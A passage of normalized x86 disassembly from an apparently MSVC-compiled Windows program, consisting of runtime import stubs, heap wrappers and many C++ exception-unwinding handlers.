call [ GdipDisposeImage@IAT ]
retn
sub_440b70
push esi
mov esi ecx
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov eax [ esi + 0x24 ]
pop esi
retn
sub_440e00
retn 0x10
sub_440f80
mov al [ ecx + 0x38 ]
retn
sub_441030
mov eax [ ecx + 0x24 ]
retn
sub_4430f1
mov edx [ ebp - 0x14 ]
push edx
call [ operator delete@IAT ]
add esp 0x4
xor ebx ebx
push ebx
push ebx
call _CxxThrowException
sub_4439f1
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
push ecx
call [ HeapDestroy@IAT ]
sub_443a0c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapAlloc@IAT ]
pop ebp
retn 0x4
sub_443a23
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn 0x4
push [ ebp + 0x8 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapFree@IAT ]
sub_443a7a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push 0x0
push [ ecx + 0x4 ]
call [ HeapSize@IAT ]
pop ebp
retn 0x4
sub_443ab2
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x4 ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x4 ]
sub_443bfd
mov edi edi
push esi
mov esi ecx
lea eax [ esi + 0x14 ]
push eax
call [ DeleteCriticalSection@IAT ]
lea ecx [ esi + 0x2c ]
pop esi
jmp sub_443d78
sub_443cf6
mov edi edi
push esi
mov esi ecx
push 0x18
lea eax [ esi + 0x10 ]
push 0x0
push eax
call memset
add esp 0xc
mov eax esi
pop esi
retn
sub_443ef4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_443e5a
pop ecx
pop ebp
retn 0x4
j_sub_443f06
jmp sub_443f06
sub_443fa9
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp ??2@YAPAXI@Z
sub_443fba
cmp ecx [ rw-data ]
jne r-xdata
jmp sub_4444f8
retn
sub_4440be
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
retn
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444015
??2@YAPAXI@Z
jmp [ operator new@IAT ]
?what@exception@std@@UBEPBDXZ
jmp [ std::exception::what@IAT ]
??0exception@std@@QAE@ABV01@@Z
jmp [ std::exception::exception@IAT ]
free
jmp [ free@IAT ]
sub_444186
push 0x8
call _unlock
pop ecx
retn
sub_44418f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4440ee
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_4441f3
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
retn
push [ ebp + 0x18 ]
push [ ebp - 0x1c ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_444015
sub_4443d7
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x28 ] ecx
push eax
push ecx
call _XcptFilter
pop ecx
pop ecx
retn
sub_4444e1
call sub_4448d3
jmp sub_444256
_purecall
jmp [ _purecall@IAT ]
memset
jmp [ memset@IAT ]
?terminate@@YAXXZ
jmp [ terminate@IAT ]
sub_444655
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
_unlock
jmp [ _unlock@IAT ]
__dllonexit
jmp [ __dllonexit@IAT ]
_lock
jmp [ _lock@IAT ]
sub_4446e2
push sub_4446a0
call [ SetUnhandledExceptionFilter@IAT ]
xor eax eax
retn
_amsg_exit
jmp [ _amsg_exit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
sub_44486b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
xor edx edx
cmp [ ecx ] 0xc0000005
sete dl
mov eax edx
retn
_initterm
jmp [ _initterm@IAT ]
_initterm_e
jmp [ _initterm_e@IAT ]
sub_4448d0
xor eax eax
retn
_crt_debugger_hook
jmp [ _crt_debugger_hook@IAT ]
?_type_info_dtor_internal_method@type_info@@QAEXXZ
jmp [ type_info::_type_info_dtor_internal_method@IAT ]
_except_handler4_common
jmp [ _except_handler4_common@IAT ]
_invoke_watson
jmp [ _invoke_watson@IAT ]
_controlfp_s
jmp [ _controlfp_s@IAT ]
memcpy
jmp [ memcpy@IAT ]
__CxxFrameHandler3
jmp [ __CxxFrameHandler3@IAT ]
_CxxThrowException
jmp [ _CxxThrowException@IAT ]
__RTDynamicCast
jmp [ __RTDynamicCast@IAT ]
sub_444b80
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_444aa0
sub_444b96
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_444aa0
sub_444bac
push 0xa
call [ IsProcessorFeaturePresent@IAT ]
mov [ rw-data ] eax
xor eax eax
retn
sub_444bc0
mov esi [ ebp + 0x8 ]
jmp sub_41ef20
sub_444bc8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444bf0
mov ecx [ ebp + 0x8 ]
jmp sub_41b0b0
sub_444bf8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444c20
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_444c2e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444c50
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_41ef20
sub_444c5b
mov esi [ ebp + 0x8 ]
add esi 0x10
jmp sub_41ef20
sub_444c66
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444c90
mov ecx [ ebp - 0x10 ]
jmp sub_40e930
sub_444c98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444cc0
mov eax [ ebp - 0x10 ]
jmp sub_40ab00
sub_444cc8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444cf0
mov ecx [ ebp - 0x10 ]
jmp sub_40e320
sub_444cf8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444d20
mov ecx [ ebp - 0x10 ]
jmp sub_40e2e0
sub_444d28
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444d50
mov ecx [ ebp - 0x10 ]
jmp [ std::exception::~exception@IAT ]
sub_444d59
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444d80
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_444d88
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444db0
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_444db8
lea eax [ ebp - 0x14 ]
push eax
call sub_40a500
retn
sub_444dc2
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_444dca
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_444dd2
lea eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_444dda
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444e00
mov ecx [ ebp - 0x10 ]
jmp sub_41f5c0
sub_444e08
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444e30
mov ecx [ ebp + 0x8 ]
jmp sub_41f5c0
sub_444e38
mov ecx [ ebp + 0x8 ]
add ecx 0x28
jmp sub_422220
sub_444e43
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444e60
mov ecx [ ebp - 0x10 ]
jmp sub_440260
sub_444e68
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444e90
mov eax [ ebp - 0x10 ]
jmp sub_41b280
sub_444e98
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444ec0
mov ecx [ ebp - 0x10 ]
jmp sub_41f5c0
sub_444ec8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444ef0
mov ecx [ ebp + 0x8 ]
jmp sub_41f5c0
sub_444ef8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444f20
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444f40
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_444f4c
mov ecx [ ebp + 0x8 ]
jmp sub_41f5c0
sub_444f54
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_444f60
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_444f6c
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_444f78
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_444f84
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444fa0
mov eax [ ebp + 0x8 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_444fac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_444fd0
jmp sub_412940
sub_444fd5
jmp sub_412940
sub_444fda
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445000
mov esi [ ebp - 0x10 ]
add esi 0x4
jmp sub_439510
sub_44500b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445030
lea ecx [ ebp - 0x30 ]
jmp sub_43d460
sub_445038
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_443fba
add eax 0x8
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445060
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_445068
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_426f70
sub_445073
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445090
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_445098
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_426f70
sub_4450a3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4450c0
lea ecx [ ebp - 0x18 ]
jmp [ std::exception::~exception@IAT ]
sub_4450c9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4450f0
jmp sub_412940
sub_4450f5
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_445101
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445120
jmp sub_412940
sub_445125
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445140
jmp sub_412940
sub_445145
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445160
jmp sub_412940
sub_445165
jmp sub_412940
sub_44516a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445190
mov ecx [ ebp - 0x10 ]
jmp sub_41b0b0
sub_445198
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4451c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4451e0
lea ecx [ ebp - 0xb8 ]
jmp sub_41b2a0
sub_4451eb
lea eax [ ebp - 0xb8 ]
push eax
call sub_41b210
retn
sub_4451f8
lea ecx [ ebp - 0xb8 ]
jmp sub_41b2a0
sub_445203
lea ecx [ ebp - 0x70 ]
jmp sub_41b2a0
sub_44520b
lea eax [ ebp - 0x70 ]
push eax
call sub_41b210
retn
sub_445215
lea ecx [ ebp - 0x70 ]
jmp sub_41b2a0
sub_44521d
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xcc ]
mov ecx [ edx - 0xd0 ]
xor ecx eax
call sub_443fba
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445250
lea ecx [ ebp - 0x1c ]
jmp [ std::exception::~exception@IAT ]
sub_445259
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445280
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4452a0
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_4452ac
mov ecx [ ebp - 0x10 ]
jmp sub_40e2e0
sub_4452b4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4452d0
mov eax [ ebp - 0x18 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_4452dc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445300
mov eax [ ebp + 0x8 ]
jmp sub_40bee0
sub_445308
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445330
mov eax [ ebp - 0x10 ]
add eax 0x4
push eax
call sub_40a500
retn
sub_44533d
mov eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_445345
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445360
mov eax [ ebp - 0x20 ]
push eax
call [ `placement delete closure'@IAT ]
pop ecx
retn
sub_44536c
lea eax [ ebp + 0x8 ]
jmp sub_40ab00
sub_445374
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445390
lea eax [ ebp + 0x10 ]
jmp sub_40bee0
sub_445398
lea eax [ ebp + 0x10 ]
push eax
call sub_40a500
retn
sub_4453a2
lea eax [ ebp + 0x10 ]
jmp sub_40bee0
sub_4453aa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4453d0
mov eax [ ebp - 0x10 ]
add eax 0x4
push eax
call sub_40a500
retn
sub_4453dd
mov eax [ ebp - 0x10 ]
jmp sub_40bee0
sub_4453e5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445400
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_445408
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445430
mov ecx [ ebp - 0x10 ]
jmp [ std::exception::~exception@IAT ]
sub_445439
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445460
mov eax [ ebp + 0x8 ]
push eax
call sub_4016d0
retn
sub_44546a
mov ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_445472
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_402ca0
sub_44547d
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_445485
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_44548d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4454b0
mov ecx [ ebp + 0x8 ]
jmp sub_402ca0
sub_4454b8
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_402ca0
sub_4454c3
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_4454cb
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_4454d3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4454f0
jmp sub_412940
sub_4454f5
lea ecx [ ebp - 0x20 ]
jmp [ std::exception::~exception@IAT ]
sub_4454fe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x24 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445520
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402ca0
sub_44552b
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_402ca0
sub_445536
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_402ca0
sub_445541
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_445549
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_445551
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_445559
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445580
mov ecx [ ebp - 0x10 ]
jmp sub_4416e0
sub_445588
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_402ca0
sub_445593
mov eax [ ebp - 0x10 ]
add eax 0x18
push eax
call sub_40a500
retn
sub_4455a0
mov eax [ ebp - 0x10 ]
add eax 0x1c
push eax
call sub_40a500
retn
sub_4455ad
mov eax [ ebp - 0x10 ]
add eax 0x20
push eax
call sub_40a500
retn
sub_4455ba
mov ecx [ ebp - 0x10 ]
add ecx 0x24
jmp sub_402ca0
sub_4455c5
mov ecx [ ebp - 0x10 ]
add ecx 0x28
jmp sub_402ca0
sub_4455d0
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_4455d8
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_4455e0
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_4455e8
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_4455f0
mov eax [ ebp - 0x14 ]
jmp sub_40bee0
sub_4455f8
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_445600
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445620
mov eax [ ebp - 0x10 ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_44562c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445650
mov ecx [ ebp - 0x10 ]
jmp sub_41f5c0
sub_445658
mov ecx [ ebp - 0x10 ]
add ecx 0x28
jmp sub_422220
sub_445663
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445680
mov eax [ ebp - 0x14 ]
jmp sub_41b280
sub_445688
mov ecx [ ebp - 0x14 ]
jmp sub_440260
sub_445690
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4456b0
mov eax [ ebp - 0x14 ]
jmp sub_41b280
sub_4456b8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4456e0
lea esi [ ebp - 0x4c ]
jmp sub_439510
sub_4456e8
lea esi [ ebp - 0x3c ]
jmp sub_439510
sub_4456f0
jmp sub_412940
sub_4456f5
jmp sub_412940
sub_4456fa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445720
mov ecx [ ebp - 0x10 ]
add ecx 0xc
jmp sub_402ca0
sub_44572b
mov ecx [ ebp - 0x10 ]
add ecx 0x10
jmp sub_402ca0
sub_445736
mov ecx [ ebp - 0x10 ]
add ecx 0x14
jmp sub_402ca0
sub_445741
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_445749
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_445751
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_445759
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445780
jmp sub_412940
sub_445785
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_443fba
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4457b0
mov ecx [ ebp - 0x18 ]
add ecx 0x8
jmp sub_402ca0
sub_4457bb
mov ecx [ ebp - 0x18 ]
add ecx 0x24
jmp sub_402ca0
sub_4457c6
mov eax [ ebp - 0x1c ]
jmp sub_402d20
sub_4457ce
mov eax [ ebp - 0x1c ]
jmp sub_402d20
sub_4457d6
mov esi [ ebp - 0x1c ]
add esi 0x4
jmp sub_439510
sub_4457e1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445800
mov ecx [ ebp - 0x18 ]
add ecx 0x8
jmp sub_402ca0
sub_44580b
mov eax [ ebp - 0x18 ]
jmp sub_402d20
sub_445813
mov ecx [ ebp - 0x18 ]
add ecx 0x8
jmp sub_402ca0
sub_44581e
mov esi [ ebp - 0x18 ]
add esi 0x28
jmp sub_439510
sub_445829
mov eax [ ebp - 0x18 ]
jmp sub_402d20
sub_445831
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445850
mov ecx [ ebp - 0x10 ]
jmp sub_426c20
sub_445858
mov ecx [ ebp - 0x10 ]
add ecx 0x74
jmp sub_402ca0
sub_445863
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44586b
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_445873
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_426f70
sub_44587e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4458a0
jmp sub_412940
sub_4458a5
lea esi [ ebp - 0x10 ]
jmp sub_41f4f0
sub_4458ad
lea esi [ ebp + 0x8 ]
jmp sub_41f4f0
sub_4458b5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4458d0
jmp sub_412940
sub_4458d5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4458f0
mov ecx [ ebp - 0x10 ]
jmp sub_426c20
sub_4458f8
mov ecx [ ebp - 0x10 ]
add ecx 0xe8
jmp sub_402ca0
sub_445906
mov eax [ ebp - 0x14 ]
jmp sub_402d20
sub_44590e
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_445916
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_426f70
sub_445921
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445940
mov ecx [ ebp + 0x8 ]
add ecx 0x4
jmp sub_402ca0
sub_44594b
mov eax [ ebp + 0x8 ]
jmp sub_402d20
sub_445953
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_445970
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_402ca0
sub_44597b
mov eax [ ebp - 0x10 ]
jmp sub_402d20
sub_445983
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4459a0
mov ecx [ ebp - 0x10 ]
jmp sub_426c20
sub_4459a8
mov ecx [ ebp - 0x10 ]
jmp sub_40e460
sub_4459b0
mov ecx [ ebp - 0x10 ]
add ecx 0x70
jmp sub_426f70
sub_4459bb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_443fba
mov eax r--data
jmp __CxxFrameHandler3
sub_4459e0
jmp sub_412940
sub_4459e5
lea ecx [ ebp - 0x34 ]
jmp sub_41b2a0
sub_4459ed
lea eax [ ebp - 0x48 ]
jmp sub_41b290
sub_4459f5
lea ecx [ ebp - 0x38 ]
jmp sub_41b2a0
sub_4459fd
mov eax [ ebp - 0x3c ]
push eax
call [ operator delete@IAT ]
pop ecx
retn
sub_445a09
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_443fba
